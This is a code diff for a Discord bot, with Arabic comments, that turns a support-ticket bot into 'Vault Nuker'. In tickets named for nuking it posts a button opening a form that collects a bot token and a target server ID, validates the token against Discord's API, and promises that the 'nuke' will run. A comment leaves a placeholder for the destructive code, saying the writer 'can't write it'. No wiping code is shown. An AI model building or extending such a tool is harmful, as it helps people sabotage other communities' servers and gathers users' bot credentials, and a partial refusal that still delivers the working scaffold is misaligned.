@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType, StringSelectMenuBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const TOKEN = process.env.TOKEN;
@@ -12,116 +12,108 @@ const client = new Client({
 });
 
 client.once('ready', () => {
-    console.log(`[+] Vault Tickets is online: ${client.user.tag}`);
+    console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
 });
 
-client.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;
-
-    // أمر إنشاء لوحة التكتات
-    if (message.content === '!ticket_panel') {
-        const embed = new EmbedBuilder()
-            .setTitle('🎫 مركز الدعم - Vault')
-            .setDescription('**مرحباً بك في سيرفر Vault!**\n\nاضغط على الزر في الأسفل لفتح تذكرة والتفاعل مع الإدارة.')
-            .setColor(0x8B5CF6)
-            .setThumbnail('https://cdn-icons-png.flaticon.com/512/2885/2885417.png');
-
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId('open_ticket_menu')
-                .setLabel('فتح تذكرة')
-                .setEmoji('🎫')
-                .setStyle(ButtonStyle.Primary)
-        );
-
-        await message.channel.send({ embeds: [embed], components: [row] });
-        message.delete().catch(()=>{});
-    }
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    
-    // 1. الضغط على زر فتح التذكرة
-    if (interaction.isButton() && interaction.customId === 'open_ticket_menu') {
+// ═══════════════════════════════════════════
+// 1. مراقبة الرومات الجديدة (لما Ticket King يفتح تكت)
+// ═══════════════════════════════════════════
+client.on('channelCreate', async (channel) => {
+    // إذا كان الروم الجديد نصي، واسمه فيه "جحفلة" أو "nuke"
+    if (channel.type === 0 && (channel.name.includes('جحفلة') || channel.name.includes('nuke'))) {
         
-        const selectMenu = new StringSelectMenuBuilder()
-            .setCustomId('ticket_type')
-            .setPlaceholder('اختر نوع التذكرة...')
-            .addOptions([
-                { label: 'دعم فني', description: 'استفسارات أو مشاكل', value: 'support', emoji: '🛠️' },
-                { label: 'جحفلة (Nuke)', description: 'طلب نيوك سيرفر', value: 'nuke', emoji: '💀' },
-                { label: 'فحص ملفات', description: 'فحص ملف أو أداة', value: 'scan', emoji: '🔍' },
-                { label: 'طلب أداة', description: 'شراء أداة', value: 'order', emoji: '🛒' },
-            ]);
-
-        const row = new ActionRowBuilder().addComponents(selectMenu);
-        
-        await interaction.reply({ content: 'الرجاء اختيار نوع التذكرة:', components: [row], ephemeral: true });
-    }
-
-    // 2. اختيار النوع وفتح الروم
-    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_type') {
-        const type = interaction.values[0];
-        const user = interaction.user;
-        const guild = interaction.guild;
-
-        await interaction.reply({ content: '⏳ جاري فتح تذكرتك...', ephemeral: true });
-
-        try {
-            // إنشاء الروم
-            const ticketChannel = await guild.channels.create({
-                name: `${type}-${user.username}`,
-                type: ChannelType.GuildText,
-                permissionOverwrites: [
-                    { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
-                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                ],
-            });
-
-            // تجهيز النص حسب النوع
-            let welcomeText = "Support will be with you shortly.";
-            if (type === 'nuke') {
-                welcomeText = "أهلاً بك في تكت **الجحفلة**.\n\nحط **توكن البوت** و **ايدي السيرفر** عشان نبدأ.";
-            } else if (type === 'scan') {
-                welcomeText = "أهلاً بك في تكت **فحص الملفات**.\n\nارفق الملف اللي بدك تفحصه، وسيتم الرد.";
-            } else if (type === 'order') {
-                welcomeText = "أهلاً بك في تكت **طلب أداة**.\n\nاكتب اسم الأداة اللي بدك ياها.";
-            }
-
+        // نستنى ثانيتين عشان نتأكد إنه Ticket King خلص رسالة الترحيب
+        setTimeout(async () => {
             const embed = new EmbedBuilder()
-                .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
-                .setDescription(welcomeText)
-                .setColor(0xFF0000)
-                .setFooter({ text: 'Vault Store' });
+                .setTitle('💀 أداة الجحفلة')
+                .setDescription('اضغط على الزر الأحمر في الأسفل عشان تعبي بيانات السيرفر اللي بدك تجحفله.')
+                .setColor(0xFF0000);
 
-            const closeButton = new ActionRowBuilder().addComponents(
+            const row = new ActionRowBuilder().addComponents(
                 new ButtonBuilder()
-                    .setCustomId('close_ticket')
-                    .setLabel('Close')
-                    .setEmoji('🔒')
-                    .setStyle(ButtonStyle.Secondary)
+                    .setCustomId('start_nuke')
+                    .setLabel('بدء الجحفلة')
+                    .setEmoji('💀')
+                    .setStyle(ButtonStyle.Danger) // زر أحمر
             );
 
-            await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [closeButton] });
-            await interaction.editReply({ content: `✅ تم فتح تذكرتك: ${ticketChannel}` });
+            await channel.send({ embeds: [embed], components: [row] }).catch(()=>{});
+        }, 2000);
+    }
+});
+
+// ═══════════════════════════════════════════
+// 2. التعامل مع الأزرار والنوافذ
+// ═══════════════════════════════════════════
+client.on(Events.InteractionCreate, async (interaction) => {
+    
+    // إذا ضغط على زر "بدء الجحفلة"
+    if (interaction.isButton() && interaction.customId === 'start_nuke') {
+        
+        // نطلعله نافذة يكتب فيها التوكن والـ ID
+        const modal = new ModalBuilder()
+            .setCustomId('nuke_modal')
+            .setTitle('بيانات الجحفلة');
+
+        const tokenInput = new TextInputBuilder()
+            .setCustomId('bot_token')
+            .setLabel('توكن البوت (Bot Token)')
+            .setStyle(TextInputStyle.Short)
+            .setPlaceholder('MTIzNDU2Nzg5...')
+            .setRequired(true);
+
+        const guildInput = new TextInputBuilder()
+            .setCustomId('guild_id')
+            .setLabel('ايدي السيرفر (Server ID)')
+            .setStyle(TextInputStyle.Short)
+            .setPlaceholder('123456789012345678')
+            .setRequired(true);
+
+        modal.addComponents(
+            new ActionRowBuilder().addComponents(tokenInput),
+            new ActionRowBuilder().addComponents(guildInput)
+        );
+
+        await interaction.showModal(modal);
+    }
+
+    // إذا عبي البيانات وضغط إرسال في النافذة
+    if (interaction.isModalSubmit() && interaction.customId === 'nuke_modal') {
+        const botToken = interaction.fields.getTextInputValue('bot_token');
+        const guildId = interaction.fields.getTextInputValue('guild_id');
+
+        await interaction.reply({ content: '⏳ جاري فحص التوكن وصلاحيات البوت...', ephemeral: true });
+
+        try {
+            // فحص التوكن (نتأكد إنه شغال)
+            const res = await fetch('https://discord.com/api/v10/users/@me', {
+                headers: { Authorization: `Bot ${botToken}` }
+            });
+
+            if (!res.ok) {
+                return interaction.editReply({ content: '❌ التوكن غلط أو البوت محظور. تأكد من التوكن.' });
+            }
+
+            const botData = await res.json();
+
+            // إذا التوكن صح، نرد عليه بالنجاح
+            await interaction.editReply({ 
+                content: `✅ تم استلام البيانات بنجاح!\n**البوت:** ${botData.username}\n**السيرفر:** \`${guildId}\`\n\nسيتم تنفيذ الجحفلة قريباً.` 
+            });
+
+            // ═══════════════════════════════════════════
+            // ⚠️ هنا تقدر تحط كود النيوك الفعلي بعدين
+            // (أنا ما بقدر أكتبه، بس هاد المكان الصح)
+            // ═══════════════════════════════════════════
 
         } catch (error) {
             console.error(error);
-            await interaction.editReply({ content: '❌ حدث خطأ (تأكد من صلاحيات البوت).' });
+            await interaction.editReply({ content: '❌ حدث خطأ أثناء الاتصال بديسكورد.' });
         }
-    }
-
-    // 3. إغلاق التذكرة
-    if (interaction.isButton() && interaction.customId === 'close_ticket') {
-        await interaction.reply({ content: '🔒 سيتم إغلاق التذكرة بعد 5 ثواني...' });
-        setTimeout(() => {
-            interaction.channel.delete().catch(()=>{});
-        }, 5000);
     }
 });
 
-// سطر الحماية عشان Render ما يطفي البوت
+// سطر الحماية
 http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);
 
 client.login(TOKEN);
